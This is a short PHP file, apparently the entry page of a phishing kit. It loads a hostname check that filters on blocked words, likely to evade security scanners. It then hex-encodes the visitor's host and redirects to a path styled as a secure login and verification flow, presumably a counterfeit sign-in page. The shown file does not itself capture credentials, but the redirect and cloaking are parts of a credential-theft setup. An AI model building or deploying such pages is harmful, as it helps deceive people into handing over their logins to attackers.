<?php
/*
* index.php
*/
require_once 'hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="info/index.php?secure-auth/login?execution=e1s1$host-7118711verify819";

header("location: $Logon");


?>
